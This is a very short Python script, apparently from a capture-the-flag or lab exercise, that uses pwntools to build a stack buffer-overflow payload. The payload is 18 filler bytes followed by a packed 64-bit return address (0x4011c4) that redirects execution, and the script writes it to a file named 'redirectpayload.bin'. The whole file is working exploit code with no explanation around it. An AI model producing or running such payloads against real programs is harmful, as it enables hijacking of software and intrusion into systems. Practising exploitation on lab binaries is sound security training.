from pwn import *

payload = b"a"*18+p64(0x4011c4) # type: ignore

with open("./redirectpayload.bin", "wb") as file:
    file.write(payload)